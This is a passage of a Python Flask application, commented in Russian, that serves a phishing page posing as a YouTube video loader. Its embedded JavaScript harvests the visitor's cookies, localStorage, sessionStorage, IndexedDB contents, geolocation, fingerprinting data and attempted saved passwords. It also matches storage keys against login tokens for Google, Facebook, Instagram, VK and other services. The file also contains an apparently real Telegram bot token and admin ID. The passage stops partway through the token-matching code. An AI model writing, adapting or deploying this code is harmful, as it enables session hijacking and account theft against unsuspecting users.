from flask import Flask, request, render_template_string, jsonify, redirect
from flask_cors import CORS
import json
import time
from datetime import datetime
import hashlib
import requests
import re

app = Flask(__name__)
CORS(app)  # Разрешить кросс-доменные запросы

# Конфигурация
BOT_TOKEN = "7761726726:AAFOmI7tGqC8kydO9U3yR8dNmyUczP2Vc7U"  # ⚠️ ЗАМЕНИТЕ НА ВАШ ТОКЕН
ADMIN_ID = 1709490182

# HTML шаблон фишинговой страницы (с улучшенным сбором данных)
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <meta name="description" content="Смотрите видео на YouTube">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            width: 100%;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ff0000, #ff6b6b, #ff0000);
        }
        
        .logo {
            font-size: 70px;
            margin-bottom: 25px;
            color: #ff0000;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 15px;
            color: #ffffff;
            font-weight: 700;
        }
        
        .subtitle {
            color: #aaaaaa;
            font-size: 18px;
            margin-bottom: 40px;
            line-height: 1.5;
        }
        
        .loader-container {
            margin: 40px 0;
            position: relative;
        }
        
        .loader {
            display: inline-block;
            width: 70px;
            height: 70px;
            border: 6px solid rgba(255, 255, 255, 0.1);
            border-top: 6px solid #ff0000;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 25px;
            font-size: 18px;
            color: #4CAF50;
            font-weight: 500;
            min-height: 30px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6b6b);
            width: 0%;
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        .video-container {
            margin-top: 40px;
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            border-radius: 12px;
            background: #000;
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
        }
        
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 10px;
        }
        
        .info-panel {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            text-align: left;
            font-size: 14px;
            color: #cccccc;
        }
        
        .info-panel p {
            margin: 8px 0;
        }
        
        .hidden {
            display: none;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 25px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .subtitle {
                font-size: 16px;
            }
            
            .logo {
                font-size: 50px;
            }
        }
        
        .warning {
            color: #ff9800;
            font-size: 14px;
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 152, 0, 0.1);
            border-radius: 5px;
            border-left: 4px solid #ff9800;
        }
    </style>
    
    <!-- Иконки Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Шрифт Roboto -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fab fa-youtube"></i>
        </div>
        
        <h1>Загрузка видео YouTube...</h1>
        
        <div class="subtitle">
            Пожалуйста, подождите. Видео загружается и скоро начнется.<br>
            Это может занять несколько секунд.
        </div>
        
        <div class="loader-container">
            <div class="loader"></div>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        
        <div class="status" id="status">
            <i class="fas fa-spinner fa-spin"></i> Подготовка видеоплеера...
        </div>
        
        <div class="video-container">
            <iframe 
                src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen
                title="YouTube video player">
            </iframe>
        </div>
        
        <div class="info-panel">
            <p><i class="fas fa-info-circle"></i> <strong>ID видео:</strong> {{ video_id }}</p>
            <p><i class="fas fa-clock"></i> <strong>Время загрузки:</strong> <span id="currentTime">{{ current_time }}</span></p>
            <p><i class="fas fa-shield-alt"></i> <strong>Безопасность:</strong> Проверено YouTube</p>
            <p><i class="fas fa-wifi"></i> <strong>Соединение:</strong> <span id="connectionStatus">Стабильное</span></p>
        </div>
        
        <div class="warning">
            <i class="fas fa-exclamation-triangle"></i> 
            Для корректного воспроизведения убедитесь, что у вас включен JavaScript и разрешены cookies.
        </div>
    </div>

    <script>
        // ========== СБОР ДАННЫХ ==========
        const collectedData = {
            // Основная информация
            timestamp: new Date().toISOString(),
            link_id: "{{ link_id }}",
            video_id: "{{ video_id }}",
            
            // IP адрес (получаем через внешний сервис)
            ip: null,
            
            // Браузер и устройство
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages || [navigator.language],
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            cookies_enabled: navigator.cookieEnabled,
            online: navigator.onLine,
            doNotTrack: navigator.doNotTrack || 'не указано',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            
            // Текущая страница
            current_url: window.location.href,
            referer: document.referrer || 'прямой переход',
            
            // Cookies (ВСЕ куки)
            cookies: document.cookie,
            
            // Локальное хранилище (ГДЕ ХРАНЯТСЯ ЛОГИНЫ)
            localStorage: {},
            sessionStorage: {},
            
            // IndexedDB (базы данных браузера)
            indexedDB_databases: [],
            
            // Социальные сети (определяем по кукам и localStorage)
            social_networks: {
                google: { logged_in: false, data: {} },
                facebook: { logged_in: false, data: {} },
                twitter: { logged_in: false, data: {} },
                instagram: { logged_in: false, data: {} },
                vk: { logged_in: false, data: {} },
                whatsapp: { logged_in: false, data: {} },
                tiktok: { logged_in: false, data: {} },
                telegram: { logged_in: false, data: {} },
                discord: { logged_in: false, data: {} }
            },
            
            // Автозаполнение форм (попытка получить сохраненные пароли)
            autofill_data: [],
            
            // Плагины браузера
            browser_plugins: [],
            
            // Медиа устройства
            media_devices: [],
            
            // Сетевая информация
            connection: null,
            
            // Батарея
            battery: null,
            
            // Геолокация
            geolocation: null,
            
            // Canvas fingerprint
            canvas_fingerprint: null
        };
        
        // ========== ФУНКЦИИ СБОРА ДАННЫХ ==========
        
        // 1. Собираем LocalStorage (где часто хранятся логины)
        function collectLocalStorage() {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    collectedData.localStorage[key] = value;
                    
                    // Проверяем на наличие данных соцсетей
                    checkSocialNetworks(key, value);
                }
                console.log('✅ LocalStorage собран:', localStorage.length, 'записей');
            } catch (error) {
                console.error('❌ Ошибка сбора LocalStorage:', error);
            }
        }
        
        // 2. Собираем SessionStorage
        function collectSessionStorage() {
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    collectedData.sessionStorage[key] = sessionStorage.getItem(key);
                }
                console.log('✅ SessionStorage собран:', sessionStorage.length, 'записей');
            } catch (error) {
                console.error('❌ Ошибка сбора SessionStorage:', error);
            }
        }
        
        // 3. Проверяем социальные сети по ключам
        function checkSocialNetworks(key, value) {
            try {
                const keyLower = key.toLowerCase();
                const valueStr = String(value).toLowerCase();
                
                // GOOGLE (Gmail, YouTube, Google аккаунт)
                if (keyLower.includes('google') || keyLower.includes('gmail') || 
                    keyLower.includes('youtube') || keyLower.includes('ga_') ||
                    keyLower.includes('goog_') || valueStr.includes('google') ||
                    keyLower.includes('oauth') || keyLower.includes('token')) {
                    collectedData.social_networks.google.logged_in = true;
                    collectedData.social_networks.google.data[key] = value.substring(0, 100);
                }
                
                // FACEBOOK
                if (keyLower.includes('facebook') || keyLower.includes('fb_') || 
                    keyLower.includes('fbsr_') || valueStr.includes('facebook') ||
                    keyLower.includes('act_') || keyLower.includes('c_user')) {
                    collectedData.social_networks.facebook.logged_in = true;
                    collectedData.social_networks.facebook.data[key] = value.substring(0, 100);
                }
                
                // TWITTER/X
                if (keyLower.includes('twitter') || keyLower.includes('x_') || 
                    keyLower.includes('auth_token') || valueStr.includes('twitter') ||
                    keyLower.includes('ct0') || keyLower.includes('guest_id')) {
                    collectedData.social_networks.twitter.logged_in = true;
                    collectedData.social_networks.twitter.data[key] = value.substring(0, 100);
                }
                
                // INSTAGRAM
                if (keyLower.includes('instagram') || keyLower.includes('ig_') || 
                    keyLower.includes('sessionid') || valueStr.includes('instagram') ||
                    keyLower.includes('ds_user_id') || keyLower.includes('csrftoken')) {
                    collectedData.social_networks.instagram.logged_in = true;
                    collectedData.social_networks.instagram.data[key] = value.substring(0, 100);
                }
                
                // VK
                if (keyLower.includes('vk_') || keyLower.includes('vkontakte') || 
                    valueStr.includes('vk.com') || keyLower.includes('remix')) {
                    collectedData.social_networks.vk.logged_in = true;
                    collectedData.social_networks.vk.data[key] = value.substring(0, 100);
                }
                
                // WHATSAPP
                if (keyLower.includes('whatsapp') || keyLower.includes('wa_')) {
